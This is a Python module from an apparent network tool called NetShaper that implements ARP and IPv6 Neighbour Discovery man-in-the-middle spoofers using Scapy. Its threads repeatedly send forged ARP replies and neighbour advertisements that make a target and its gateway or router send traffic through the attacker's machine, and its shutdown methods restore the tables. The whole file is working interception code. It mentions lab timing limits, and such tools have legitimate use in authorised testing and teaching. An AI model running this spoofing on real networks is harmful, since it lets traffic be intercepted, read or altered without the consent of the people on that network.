"""
NetShaper — ARP and NDP (IPv6 Neighbour Discovery) MITM spoofers.

Both classes take a `session` reference for lockless is-active checks.
The TYPE_CHECKING import avoids a circular dependency at runtime
(spoofers ← session ← spoofers).
"""
from __future__ import annotations

import logging
import threading
import time
from typing import TYPE_CHECKING, List

from netshaper.network.backends import RealPacketBackend

if TYPE_CHECKING:
    from netshaper.core.session import TargetSession

log = logging.getLogger("netshaper")

MIN_SPOOF_INTERVAL = 0.25
MAX_SPOOF_INTERVAL = 10.0
MIN_SPOOF_BURST = 1
MAX_SPOOF_BURST = 5

ARP = None
Ether = None
IPv6 = None
ICMPv6ND_NA = None
ICMPv6NDOptDstLLAddr = None


def _ensure_scapy_layers() -> None:
    global ARP, Ether, IPv6, ICMPv6ND_NA, ICMPv6NDOptDstLLAddr
    if (ARP is None or Ether is None or IPv6 is None
            or ICMPv6ND_NA is None or ICMPv6NDOptDstLLAddr is None):
        from scapy.all import (
            ARP as scapy_ARP,
            Ether as scapy_Ether,
            ICMPv6ND_NA as scapy_ICMPv6ND_NA,
            ICMPv6NDOptDstLLAddr as scapy_ICMPv6NDOptDstLLAddr,
            IPv6 as scapy_IPv6,
        )

        if ARP is None:
            ARP = scapy_ARP
        if Ether is None:
            Ether = scapy_Ether
        if IPv6 is None:
            IPv6 = scapy_IPv6
        if ICMPv6ND_NA is None:
            ICMPv6ND_NA = scapy_ICMPv6ND_NA
        if ICMPv6NDOptDstLLAddr is None:
            ICMPv6NDOptDstLLAddr = scapy_ICMPv6NDOptDstLLAddr


def validate_spoof_timing(interval: float, burst: int) -> tuple[float, int]:
    """Validate bounded lab timing controls shared by ARP and NDP spoofers."""
    if not MIN_SPOOF_INTERVAL <= interval <= MAX_SPOOF_INTERVAL:
        raise ValueError(
            f"spoof interval must be between {MIN_SPOOF_INTERVAL} "
            f"and {MAX_SPOOF_INTERVAL} seconds"
        )
    if not MIN_SPOOF_BURST <= burst <= MAX_SPOOF_BURST:
        raise ValueError(
            f"spoof burst must be between {MIN_SPOOF_BURST} "
            f"and {MAX_SPOOF_BURST} packets"
        )
    return float(interval), int(burst)


def _send_burst(packet_backend, packet, interface: str, burst: int) -> None:
    for _ in range(burst):
        packet_backend.send(packet, interface)


class ARPSpoofer:
    def __init__(self, interface: str, target_ip: str, target_mac: str,
                 gateway_ip: str, gateway_mac: str, own_mac: str,
                 session: TargetSession, packet_backend=None,
                 interval: float = 2.0, burst: int = 1):
        self.interface   = interface
        self.target_ip   = target_ip
        self.target_mac  = target_mac
        self.gateway_ip  = gateway_ip
        self.gateway_mac = gateway_mac
        self.own_mac     = own_mac
        self.session     = session
        self.packet_backend = packet_backend or RealPacketBackend()
        self.interval, self.burst = validate_spoof_timing(interval, burst)
        self._stop       = threading.Event()
        self.threads: List[threading.Thread] = []

    def start(self) -> None:
        _ensure_scapy_layers()

        def spoof_target() -> None:
            """Tell target: gateway MAC = ours."""
            while (not self._stop.is_set()
                   and self.session.active
                   and not self.session.is_shutting_down):
                try:
                    packet = (
                        Ether(dst=self.target_mac, src=self.own_mac) /
                        ARP(op=2,
                            pdst=self.target_ip,  psrc=self.gateway_ip,
                            hwdst=self.target_mac, hwsrc=self.own_mac)
                    )
                    _send_burst(
                        self.packet_backend, packet, self.interface, self.burst
                    )
                except Exception as e:
                    log.error(f"[ARP→target] Injection error: {e}")
                    break
                if self._stop.wait(timeout=self.interval):
                    break
            log.info(f"[ARP spoof→target] Thread for {self.target_ip} exited.")

        def spoof_gateway() -> None:
            """Tell gateway: target MAC = ours."""
            while (not self._stop.is_set()
                   and self.session.active
                   and not self.session.is_shutting_down):
                try:
                    packet = (
                        Ether(dst=self.gateway_mac, src=self.own_mac) /
                        ARP(op=2,
                            pdst=self.gateway_ip,  psrc=self.target_ip,
                            hwdst=self.gateway_mac, hwsrc=self.own_mac)
                    )
                    _send_burst(
                        self.packet_backend, packet, self.interface, self.burst
                    )
                except Exception as e:
                    log.error(f"[ARP→gateway] Injection error: {e}")
                    break
                if self._stop.wait(timeout=self.interval):
                    break
            log.info(f"[ARP spoof→gateway] Thread for {self.target_ip} exited.")

        self.threads = [
            threading.Thread(target=spoof_target,  daemon=True),
            threading.Thread(target=spoof_gateway, daemon=True),
        ]
        for t in self.threads:
            t.start()
        log.info(
            f"ARP spoofing active → {self.target_ip} "
            f"(burst={self.burst}, interval={self.interval:.2f}s)"
        )

    def shutdown(self) -> None:
        _ensure_scapy_layers()
        self._stop.set()
        for t in self.threads:
            t.join(timeout=3.0)
        # Keep the real peer in the ARP payload while using our own L2 source.
        # Spoofing the peer as Ether.src makes bridges/switches relearn that
        # peer on this port and can prevent the opposite repair from arriving.
        for _ in range(3):
            self.packet_backend.send(
                Ether(dst=self.target_mac, src=self.own_mac) /
                ARP(op=2,
                    pdst=self.target_ip,  psrc=self.gateway_ip,
                    hwdst=self.target_mac, hwsrc=self.gateway_mac),
                self.interface)
            self.packet_backend.send(
                Ether(dst=self.gateway_mac, src=self.own_mac) /
                ARP(op=2,
                    pdst=self.gateway_ip,  psrc=self.target_ip,
                    hwdst=self.gateway_mac, hwsrc=self.target_mac),
                self.interface)
            time.sleep(0.3)
        log.info("ARP tables restored")


class NDPSpoofer:
    """
    Correct MITM NDP directions:
      spoof_target → tell TARGET  our MAC = router's
      spoof_router → tell ROUTER  our MAC = target's
    """
    def __init__(self, interface: str,
                 target_ipv6: str, target_mac: str,
                 router_ipv6: str, router_mac: str,
                 own_mac: str, session: TargetSession, packet_backend=None,
                 interval: float = 2.0, burst: int = 1):
        self.interface   = interface
        self.target_ipv6 = target_ipv6
        self.target_mac  = target_mac
        self.router_ipv6 = router_ipv6
        self.router_mac  = router_mac
        self.own_mac     = own_mac
        self.session     = session
        self.packet_backend = packet_backend or RealPacketBackend()
        self.interval, self.burst = validate_spoof_timing(interval, burst)
        self._stop       = threading.Event()
        self.threads: List[threading.Thread] = []

    def start(self) -> None:
        _ensure_scapy_layers()

        def spoof_target() -> None:
            while (not self._stop.is_set()
                   and self.session.active
                   and not self.session.is_shutting_down):
                try:
                    pkt = (
                        Ether(dst=self.target_mac, src=self.own_mac) /
                        IPv6(
                            dst=self.target_ipv6,
                            src=self.router_ipv6,
                            hlim=255,
                        ) /
                        ICMPv6ND_NA(tgt=self.router_ipv6, R=1, S=1, O=1) /
                        ICMPv6NDOptDstLLAddr(lladdr=self.own_mac)
                    )
                    _send_burst(
                        self.packet_backend, pkt, self.interface, self.burst
                    )
                except Exception as e:
                    log.error(f"[NDP→target] Injection error: {e}")
                    break
                if self._stop.wait(timeout=self.interval):
                    break

        def spoof_router() -> None:
            while (not self._stop.is_set()
                   and self.session.active
                   and not self.session.is_shutting_down):
                try:
                    pkt = (
                        Ether(dst=self.router_mac, src=self.own_mac) /
                        IPv6(
                            dst=self.router_ipv6,
                            src=self.target_ipv6,
                            hlim=255,
                        ) /
                        ICMPv6ND_NA(tgt=self.target_ipv6, R=0, S=1, O=1) /
                        ICMPv6NDOptDstLLAddr(lladdr=self.own_mac)
                    )
                    _send_burst(
                        self.packet_backend, pkt, self.interface, self.burst
                    )
                except Exception as e:
                    log.error(f"[NDP→router] Injection error: {e}")
                    break
                if self._stop.wait(timeout=self.interval):
                    break

        self.threads = [
            threading.Thread(target=spoof_target, daemon=True),
            threading.Thread(target=spoof_router,  daemon=True),
        ]
        for t in self.threads:
            t.start()
        log.info(
            f"NDP spoofing active → {self.target_ipv6} "
            f"(burst={self.burst}, interval={self.interval:.2f}s)"
        )

    def shutdown(self) -> None:
        _ensure_scapy_layers()
        self._stop.set()
        for t in self.threads:
            t.join(timeout=3.0)
        # Advertise the real peer in the ND option without teaching the
        # intervening L2 network that the peer moved onto our interface.
        for _ in range(3):
            self.packet_backend.send(
                Ether(dst=self.target_mac, src=self.own_mac) /
                IPv6(
                    dst=self.target_ipv6,
                    src=self.router_ipv6,
                    hlim=255,
                ) /
                ICMPv6ND_NA(tgt=self.router_ipv6, R=1, S=1, O=1) /
                ICMPv6NDOptDstLLAddr(lladdr=self.router_mac),
                self.interface)
            self.packet_backend.send(
                Ether(dst=self.router_mac, src=self.own_mac) /
                IPv6(
                    dst=self.router_ipv6,
                    src=self.target_ipv6,
                    hlim=255,
                ) /
                ICMPv6ND_NA(tgt=self.target_ipv6, R=0, S=1, O=1) /
                ICMPv6NDOptDstLLAddr(lladdr=self.target_mac),
                self.interface)
            time.sleep(0.3)
        log.info("NDP tables restored")
